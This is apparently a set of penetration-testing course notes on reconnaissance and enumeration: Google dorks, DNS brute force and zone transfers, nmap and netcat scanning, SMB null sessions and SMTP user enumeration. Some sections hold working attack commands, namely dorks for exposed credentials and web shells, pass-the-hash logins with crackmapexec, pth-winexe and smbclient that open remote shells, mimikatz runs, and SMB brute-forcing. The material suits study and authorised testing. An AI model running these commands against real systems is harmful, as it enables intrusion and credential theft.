<p><code>tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap</code></p>
<h1 id="passive-info-gathering">Passive Info Gathering</h1>
<h2 id="open-web-information-gathering">Open Web Information Gathering</h2>
<h3 id="google-hacking">Google Hacking</h3>
<ul>
<li><code>filetype</code></li>
<li><code>inurl</code></li>
<li><code>intitle</code></li>
<li><code>intext</code></li>
</ul>
<p>Powerpoint files with the phrase &ldquo;penetration testing&rdquo; in it, from microsoft.com</p>
<p><code>site:microsoft.com filetype:ppt &quot;penetration testing&quot;</code></p>
<p>VNC Viewer</p>
<p><code>intitle:&quot;VNC viewer for Java&quot;</code></p>
<p>Mobotix IPcam (admin creds - admin:meinsm)</p>
<p><code>inurl:&quot;/control/userimage.html&quot;</code></p>
<p>phpMyAdmin No Authentication Databases</p>
<p><code>inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin</code></p>
<p>N3tShell Compromised Websites</p>
<p><code>intitle:&quot;-N3t&quot; filetype:php undetectable</code></p>
<p>Default Pages of Devices</p>
<p><code>intitle:&quot;NetBotz Applicance&quot; &quot;OK&quot; -filetype:pdf</code></p>
<p>Hardware with Known Vulnerabilities</p>
<p><code>intitle:&quot;SpeedStream Router Management Interface&quot;</code></p>
<p>Web Accessible, Open Cisco Routers</p>
<p><code>inurl:&quot;level/15/exec/-/show&quot;</code></p>
<p>Exposed Frontpage Credentials</p>
<p><code>&quot;# -FrontPage-&quot; filetype:pwd inurl:(service | authors | administrators | users)</code></p>
<h2 id="email-harvesting">Email Harvesting</h2>
<p><code>theharvester -d cisco.com -b google</code></p>
<h2 id="additional-resources">Additional Resources</h2>
<h3 id="netcraft">Netcraft</h3>
<p><a href="https://www.netcraft.com/">https://www.netcraft.com/</a></p>
<p>Find all subdomains</p>
<p><code>*.cisco.com</code></p>
<h3 id="whois">Whois</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">whois cisco.com
whois 8.8.8.8
</code></pre></div><h2 id="recon-ng">Recon-ng</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">recon-ng
use recon/domains-contacts/whois_pocs <span style="color:#75715e"># Contact details from whois results</span>
use recon/domains-vulnerabilities/xssed <span style="color:#75715e"># Find xss vulnerabilities using xssed.com</span>
use recon/domains-hosts/google_site_web <span style="color:#75715e"># Automatically find subdomains using Google search</span>
</code></pre></div><h1 id="active-information-gathering">Active Information Gathering</h1>
<h2 id="41-dns-enumeration">4.1 DNS Enumeration</h2>
<h3 id="interacting-with-a-dns-server">Interacting with a DNS Server</h3>
<p><code>host -t [type] [domain]</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">host -t ns conglomerate.com <span style="color:#75715e"># dns nameservers</span>
host -t mx conglomerate.com <span style="color:#75715e"># mailservers</span>
</code></pre></div><h3 id="automating-lookups">Automating Lookups</h3>
<p>Forward Lookup</p>
<p><code>host [subdomain]</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">host www.conglomerate.com <span style="color:#75715e"># get ip of www.conglomerate.com</span>
host idontexist.conglomerate.com <span style="color:#75715e"># attempt to get ip of non existant subdomain</span>
</code></pre></div><h3 id="forward-lookup-brute-force">Forward Lookup Brute Force</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~# echo www &gt; list.txt
root@kali:~# echo ftp &gt;&gt; list.txt
root@kali:~# echo mail &gt;&gt; list.txt
root@kali:~# echo owa &gt;&gt; list.txt
root@kali:~# echo proxy &gt;&gt; list.txt
root@kali:~# echo router &gt;&gt; list.txt
root@kali:~# <span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>cat list.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> host $ip.conglomerate.com | grep <span style="color:#e6db74">&#39;has address&#39;</span>; <span style="color:#66d9ef">done</span>
www.conglomerate.com has address 38.100.193.76
mail.conglomerate.com has address 38.100.193.84
router.conglomerate.com has address 38.100.193.71
</code></pre></div><h3 id="reverse-lookup-brute-force">Reverse Lookup Brute Force</h3>
<p><code>host [ip]</code></p>
<p>With a rough idea of the target&rsquo;s subnet range, perform a reverse lookup brute force.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/Downloads# <span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> host 38.100.193.$ip | grep -v <span style="color:#e6db74">&#39;not found&#39;</span> | grep conglomerate.com; <span style="color:#66d9ef">done</span>
66.193.100.38.in-addr.arpa domain name pointer syslog.conglomerate.com.
69.193.100.38.in-addr.arpa domain name pointer beta.conglomerate.com.
70.193.100.38.in-addr.arpa domain name pointer ns1.conglomerate.com.
72.193.100.38.in-addr.arpa domain name pointer admin.conglomerate.com.
73.193.100.38.in-addr.arpa domain name pointer mail2.conglomerate.com.
76.193.100.38.in-addr.arpa domain name pointer www.conglomerate.com.
77.193.100.38.in-addr.arpa domain name pointer vpn.conglomerate.com.
80.193.100.38.in-addr.arpa domain name pointer ns2.conglomerate.com.
84.193.100.38.in-addr.arpa domain name pointer mail.conglomerate.com.
85.193.100.38.in-addr.arpa domain name pointer snmp.conglomerate.com.
89.193.100.38.in-addr.arpa domain name pointer siem.conglomerate.com.
90.193.100.38.in-addr.arpa domain name pointer ns3.conglomerate.com.
91.193.100.38.in-addr.arpa domain name pointer router.conglomerate.com.
</code></pre></div><h3 id="dns-zone-transfers">DNS Zone Transfers</h3>
<p>If TCP port 53 is open, it may indicate that DNS zone transfers work.</p>
<p><code>host -l [domain] [nameserver]</code> or <code>host -t axfr [domain] [nameserver]</code></p>
<h4 id="failed-zone-transfer">Failed Zone Transfer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/Downloads# host -l conglomerate.com ns1.conglomerate.com
Using domain server:
Name: ns1.conglomerate.com
Address: 38.100.193.70#53
Aliases:

Host conglomerate.com not found: 5<span style="color:#f92672">(</span>REFUSED<span style="color:#f92672">)</span>
; Transfer failed.
</code></pre></div><h4 id="successful-zone-transfer">Successful Zone Transfer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@kali:~/Downloads# host -l conglomerate.com ns2.conglomerate.com
Using domain server:
Name: ns2.conglomerate.com
Address: 38.100.193.80#53
Aliases:

conglomerate.com name server ns1.conglomerate.com.
conglomerate.com name server ns2.conglomerate.com.
conglomerate.com name server ns3.conglomerate.com.
admin.conglomerate.com has address 38.100.193.83
beta.conglomerate.com has address 38.100.193.88
fs1.conglomerate.com has address 38.100.193.82
intranet.conglomerate.com has address 38.100.193.87
mail.conglomerate.com has address 38.100.193.84
mail2.conglomerate.com has address 38.100.193.73
ns1.conglomerate.com has address 38.100.193.70
ns2.conglomerate.com has address 38.100.193.80
ns3.conglomerate.com has address 38.100.193.90
router.conglomerate.com has address 38.100.193.71
siem.conglomerate.com has address 38.100.193.89
snmp.conglomerate.com has address 38.100.193.85
support.conglomerate.com has address 173.246.47.170
syslog.conglomerate.com has address 38.100.193.66
test.conglomerate.com has address 38.100.193.67
vpn.conglomerate.com has address 38.100.193.77
www.conglomerate.com has address 38.100.193.76
www2.conglomerate.com has address 38.100.193.79
</code></pre></div><h4 id="automating-zone-transfers">Automating Zone Transfers</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
    echo <span style="color:#e6db74">&#34;Usage: </span>$0<span style="color:#e6db74"> [domain name]&#34;</span>
    exit <span style="color:#ae81ff">1</span>
<span style="color:#66d9ef">fi</span>

<span style="color:#66d9ef">for</span> server in <span style="color:#66d9ef">$(</span>host -t ns $1 | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f4<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
    host -l $1 $server | grep <span style="color:#e6db74">&#39;has address&#39;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><h3 id="relevant-tools-in-kali">Relevant Tools in Kali</h3>
<h4 id="4161---dnsrecon">4.1.6.1 - <code>dnsrecon</code></h4>
<ul>
<li><code>dnsrecon -d conglomerate.com</code></li>
<li><code>dnsrecon -d conglomerate.com -t axfr</code></li>
<li><code>dnsrecon -r 38.100.193.0/24 | grep conglomerate.com</code></li>
</ul>
<h4 id="4161---dnsenum">4.1.6.1 - <code>dnsenum</code></h4>
<ul>
<li><code>dnsenum zonetransfer.me</code></li>
</ul>
<h2 id="port-scanning">Port Scanning</h2>
<h3 id="tcp-connect--syn-scanning">TCP Connect / SYN Scanning</h3>
<h4 id="4211---connect-scanning">4.2.1.1 - Connect Scanning</h4>
<p>Relies on three-way/TCP handshake mechanism (syn, syn/ack, ack). Connect scan involves completing this handshake, if it is completed, port is open.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -nvv -w 1.5 -z 10.0.0.19 3388-3390
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.0.0.19<span style="color:#f92672">]</span> <span style="color:#ae81ff">3390</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.0.0.19<span style="color:#f92672">]</span> <span style="color:#ae81ff">3389</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.0.0.19<span style="color:#f92672">]</span> <span style="color:#ae81ff">3388</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
sent 0, rcvd <span style="color:#ae81ff">0</span>
</code></pre></div><ul>
<li><code>-n</code> - no reverse lookup</li>
<li><code>-vv</code> - more verbose</li>
<li><code>-w</code> - timeout</li>
<li><code>-z</code> - zero IO mode, used for scanning</li>
</ul>
<h4 id="4212---stealth-syn-scanning">4.2.1.2 - &ldquo;Stealth&rdquo; SYN Scanning</h4>
<p>Send SYN packet without completing the TCP handshake (without sending final ack back). If a syn/ack is sent back, port is open.</p>
<p>Early and primitive firewalls logged completed TCP sessions, making syn scanning bypass firewall logging. This is no longer true with modern firewalls, and the term &ldquo;stealth&rdquo; is misleading. Users might believe their scans will somehow not be detected, when in fact, they will be.</p>
<h4 id="udp-scanning">UDP Scanning</h4>
<p>UDP stateless, no three-way handshake. If no reply is sent back, the UDP port is open. If it is closed, an ICMP port unreachable packet should be sent back.</p>
<p>UDP scans is often unreliable, as firewalls may drop ICMP packets / not send back anything at all, leading to false positives, and you will regularly see UDP port scans showing all UDP ports open.</p>
<p>People often forget to scan for UDP services, and stick only to TCP scanning, thereby seeing only half of the equation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -unvv -w 1.5 -z 192.168.1.23 160-165
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">165</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">164</span> <span style="color:#f92672">(</span>cmip-agent<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">163</span> <span style="color:#f92672">(</span>cmip-man<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">162</span> <span style="color:#f92672">(</span>snmp-trap<span style="color:#f92672">)</span> : Connection refused
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">161</span> <span style="color:#f92672">(</span>snmp<span style="color:#f92672">)</span> open
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">160</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> : Connection refused
</code></pre></div><h3 id="port-scanning-with-nmap">Port Scanning with Nmap</h3>
<p>There is a list of nearly all ports, associated services, and probability of them being open found at <code>/usr/share/nmap/nmap-services</code>.</p>
<p>Tabbing while a scan is in progress displays the progress.</p>
<h4 id="4241---accountability-for-your-traffic">4.2.4.1 - Accountability for Your Traffic</h4>
<p>Packet and byte counter using iptables</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># Reset counters and iptables rules</span>
iptables -Z <span style="color:#f92672">&amp;&amp;</span> iptables -F

<span style="color:#75715e"># Measure incoming traffic from lab machine</span>
iptables -I INPUT <span style="color:#ae81ff">1</span> -s 192.168.1.23 -j ACCEPT

<span style="color:#75715e"># Measure outgoing traffic to lab machine</span>
iptables -I OUTPUT <span style="color:#ae81ff">1</span> -d 192.168.1.23 -j ACCEPT
</code></pre></div><p><code>watch -n 1 iptables -nvL</code></p>
<h4 id="4242---network-sweeping">4.2.4.2 - Network Sweeping</h4>
<h5 id="default-sweep">Default Sweep</h5>
<p><code>nmap -sn 192.168.1.0/24</code> or <code>nmap -sP 192.168.1.0/24</code></p>
<h5 id="output-greppable">Output Greppable</h5>
<p><code>nmap -T4 -n -sn -oG - 192.168.1.0/24 | grep Up | cut -d' ' -f2</code></p>
<h5 id="specific-port">Specific Port</h5>
<p><code>nmap -T4 -n -sn -p 80 -oG - 192.168.1.0/24</code></p>
<h5 id="aggressive-connect-scan-on-top-ports">Aggressive Connect Scan on Top Ports</h5>
<p><code>nmap -sT -A --top-ports=20 192.168.1.0/24 -oG -</code></p>
<h3 id="os-fingerprinting">OS Fingerprinting</h3>
<p>Based on the slight implementation differences of the TCP/IP stack (default TTL, TCP window size, etc.) within Operating Systems.</p>
<p><code>nmap -O 192.168.1.23</code></p>
<h3 id="banner-grabbingservice-enumeration">Banner Grabbing/Service Enumeration</h3>
<p><code>nmap -sV -sT 192.168.1.23</code></p>
<p>An aggressive <code>-A</code> scan includes both <code>-sV</code>, <code>-O</code>, script scanning and traceroute: <code>nmap -A 192.168.1.23</code></p>
<h3 id="favourite-nmap-commands">Favourite Nmap Commands</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -T4 -n -sC -sV -p- -oN nmap-versions --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;*vuln*&#39;</span> <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
</code></pre></div><h4 id="unicornscan--nmap--onetwopunch"><code>unicornscan</code> + <code>nmap</code> = <code>onetwopunch</code></h4>
<p>Unicornscan supports asynchronous scans, speeding port scans on all 65535 ports. Nmap has powerful features that unicornscan does not have. With onetwopunch, unicornscan is used first to identify open ports, and then those ports are passed to nmap to perform further enumeration.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./onetwopunch.sh -t targets.txt -i tap0 -n <span style="color:#e6db74">&#39;-T4 -n -sC -sV -oN nmap-versions --script=*vuln*&#39;</span>
</code></pre></div><p>Note, when using wildcards in nmap&rsquo;s NSE script parameter in onetwopunch, do not include quotes.</p>
<h3 id="nmap-scripting-engine-nse">Nmap Scripting Engine (NSE)</h3>
<p>Found within <code>/usr/share/nmap/scripts</code></p>
<p>Common services, SMB, SMTP, SNMP</p>
<p><code>nmap --script=[script] 192.168.1.23</code></p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<h3 id="scanning-for-the-netbios-service">Scanning for the NetBIOS Service</h3>
<p>SMB NetBIOS service listens on TCP ports 139 and 445, as well as several UDP ports.</p>
<p><code>nmap -p 139,445 --open -oG smb.txt 192.168.1.0/24</code></p>
<p><code>nbtscan -r 192.168.1.0/24</code></p>
<h3 id="null-session-enumeration">Null Session Enumeration</h3>
<h4 id="vulnerable-smb-versions">Vulnerable SMB Versions</h4>
<p>Vulnerable versions:</p>
<ul>
<li>Windows NT, 2000, and XP (most SMB1) - VULNERABLE: Null Sessions can be created by default</li>
<li>Windows 2003, and XP SP2 onwards - NOT VULNERABLE: Null Sessions can&rsquo;t be created default</li>
<li>Most Samba (Unix) servers</li>
</ul>
<p>List of SMB versions and corresponding Windows versions:</p>
<ul>
<li>SMB1 â€“ Windows 2000, XP and Windows 2003.</li>
<li>SMB2 â€“ Windows Vista SP1 and Windows 2008</li>
<li>SMB2.1 â€“ Windows 7 and Windows 2008 R2</li>
<li>SMB3 â€“ Windows 8 and Windows 2012.</li>
</ul>
<p>Empty LM and NTLM hashes:</p>
<ul>
<li>Empty LM Hash: <code>aad3b435b51404eeaad3b435b51404ee</code></li>
<li>Empty NT Hash: <code>31d6cfe0d16ae931b73c59d7e0c089c0</code></li>
</ul>
<h4 id="rpcclient"><code>rpcclient</code></h4>
<p>Manually probe a SMB server</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ rpcclient -U <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
Password:
rpcclient $&gt; srvinfo <span style="color:#75715e"># operating system version</span>
rpcclient $&gt; netshareenumall <span style="color:#75715e"># enumerate all shares and its paths</span>
rpcclient $&gt; enumdomusers <span style="color:#75715e"># enumerate usernames defined on the server</span>
rpcclient $&gt; getdompwinfo <span style="color:#75715e"># smb password policy configured on the server</span>
</code></pre></div><p>Apparently the rpcclient version in OffSec VM does not work well with creating null sessions. A downgrade to samba-4.5.15 is required: <a href="https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT_STATUS_INVALID_PARAMETER&amp;highlight=NT_STATUS_INVALID_PARAMETER">https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT_STATUS_INVALID_PARAMETER&amp;highlight=NT_STATUS_INVALID_PARAMETER</a> Place the export commands into a script and source it before using rpcclient to use the downgraded version, or place it in bashrc. NOTE, once downgraded, pth-winexe doesn&rsquo;t seem to work.</p>
<h4 id="enum4linux"><code>enum4linux</code></h4>
<p>Wrapper around smb programs like <code>rpcclient</code> to automate enumerating an SMB server. Produces tons of results when a null session is successful. NOTE: Make sure to downgrade rpcclient before using.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">enum4linux -a 192.168.1.23
enum4linux -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -a 192.168.1.23
</code></pre></div><h4 id="crackmapexec"><code>CrackMapExec</code></h4>
<p>Works perfectly, list shares and permissions, enum users, disks, code execute and run modules like mimikatz. Hashes work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">crackmapexec -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares 192.168.1.23
crackmapexec -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute <span style="color:#ae81ff">4000</span> 192.168.1.23
crackmapexec -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --users 192.168.1.23
crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192.168.1.23
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192.168.1.23 <span style="color:#75715e"># reliable pth code execution</span>
</code></pre></div><h4 id="smbmap"><code>smbmap</code></h4>
<p>Works well for listing and downloading files, and listing shares and permissions. Hashes work. Code execution don&rsquo;t work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">smbmap -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -H 192.168.1.23 <span style="color:#75715e"># similar to crackmapexec --shares</span>
smbmap -u guest -p <span style="color:#e6db74">&#39;&#39;</span> -H 192.168.1.23
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -r <span style="color:#75715e"># list top level dir</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -R <span style="color:#75715e"># list everything recursively</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -s wwwroot -R -A <span style="color:#e6db74">&#39;.*&#39;</span> <span style="color:#75715e"># download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -x whoami <span style="color:#75715e"># no work</span>
</code></pre></div><h4 id="smbclient"><code>smbclient</code></h4>
<p>Access SMB shares interactively, seems to work with anonymous access. Hashes don&rsquo;t work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">smbclient //192.168.1.23/wwwroot
smbclient //192.168.1.23/C$ WIN20082017 -U Administrator
smbclient //192.168.1.23/C$ A433F6C2B0D8BB92D7288ECFFACFC7CD -U Administrator --pw-nt-hash <span style="color:#75715e"># make sure to only use the NT portion of the hash</span>
</code></pre></div><p>WARNNIG, be careful when using the <code>get</code> command to download absolute path files from the remote system. Eg. <code>get /etc/passwd</code> will download the passwd file and ovewrite YOUR <code>/etc/passwd</code>. Use <code>get /etc/passwd /tmp/passwd</code> instead.</p>
<p>To download recursively:</p>
<pre><code># Within smbclient, download everything recursively:
mask &quot;&quot;
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
</code></pre><h5 id="pth-winexe">pth-winexe</h5>
<p>Works great sometimes. Can open a windows cmd shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd <span style="color:#75715e"># using a plaintext password</span>
pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash</span>
pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># domain user</span>
pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash</span>
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd <span style="color:#75715e"># ntlm hash + empty lm hash</span>
<span style="color:#75715e"># or</span>
export SMBHASH<span style="color:#f92672">=</span>aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U Administrator% //192.168.1.23 cmd
</code></pre></div><h5 id="psexec-metasploit">psexec Metasploit</h5>
<p><code>exploit/windows/smb/psexec</code></p>
<h5 id="xfreerdp-remote-desktop-protocol">xfreerdp Remote Desktop Protocol</h5>
<p>Before using <code>xfreerdp</code>&rsquo;s <code>/pth</code> feature, you have to build and install latest version. Apparently updating and upgrading with <code>apt-get install freerdp-x11</code> only gets you <code>FreeRDP version 1.1.0-beta1</code>. The latest already 2+. Source and compilation guide: <a href="https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/">https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/</a> Still does not work after updating though.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:192.168.1.23
</code></pre></div><h3 id="nmap-smb-nse-scripts">Nmap SMB NSE Scripts</h3>
<ul>
<li>List all smb nse scripts - <code>ls -la /usr/share/nmap/scripts/smb*</code></li>
<li>Check smb and OS using nse script - <code>nmap -p 139,445 --script=smb-os-discovery 192.168.1.23</code></li>
<li>Check certain smb vulnerability against all hosts - <code>nmap -iL hosts -Pn -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1</code></li>
<li>Enumerate smb usernames (similar to <code>enumdomusers</code> with <code>rpcclient</code>) - <code>nmap -p 139,445 --script=smb-enum-users [ip]</code></li>
<li>Brute force smb creds - <code>nmap -p 139,445 --script=smb-brute [ip]</code></li>
<li>Check many common smb vulnerabilities against a host - <code>nmap -p 139,445 --script=smb*-vuln* --script-args=unsafe=1 [ip]</code></li>
</ul>
<p>Apparently if there are more than 10 hosts in the hosts input file, nmap won&rsquo;t scan them when using NSE.</p>
<p>Nmap removed the <code>smb-check-vulns</code> script with individual scripts: <a href="https://forums.offensive-security.com/showthread.php?4008-04-3-3-Changes-to-quot-Nmap-NSE-Scripts-quot">https://forums.offensive-security.com/showthread.php?4008-04-3-3-Changes-to-quot-Nmap-NSE-Scripts-quot</a></p>
<p>Vulscan is a NSE scripting module that enhances nmap and turns it into a vulnerability scanner: <a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a></p>
<h2 id="smtp-enumeration">SMTP Enumeration</h2>
<p>Important commands include:</p>
<ul>
<li><code>VRFY</code> - Asks the server to verify an email address</li>
<li><code>EXPN</code> - Asks the server for the membership of a mailing list</li>
</ul>
<p>Abuse these to verify existing users on a mail server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc -C <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#ae81ff">25</span> <span style="color:#75715e"># remember to use `-C` in `nc`! This will force nc to send a CRLF (`\r\n`) as line-ending. A normal `\n` will not work! Telnet will work by default.</span>
<span style="color:#ae81ff">220</span> dj.acme.local Microsoft ESMTP MAIL Service, Version: 5.0.2195.6713 ready at  Mon, <span style="color:#ae81ff">19</span> Mar <span style="color:#ae81ff">2018</span> 07:27:59 +0200
VRFY barry
<span style="color:#ae81ff">250</span> 2.1.5 &lt;barry@barry&gt; <span style="color:#75715e"># user exists</span>
VRFY administrator
<span style="color:#ae81ff">550</span> 5.1.1 administrator... User unknown <span style="color:#75715e"># user does not exist</span>
VRFY bob
<span style="color:#ae81ff">252</span> 2.1.5 Cannot VRFY user, but will take message <span style="color:#66d9ef">for</span> &lt;bob@dj.acme.local&gt; <span style="color:#75715e"># servers configured properly to not VRFY a user</span>

EXPN postmaster
<span style="color:#ae81ff">250</span> 2.1.5 root &lt;root@barry&gt;
EXPN root
<span style="color:#ae81ff">250</span> 2.1.5 root &lt;root@barry&gt;
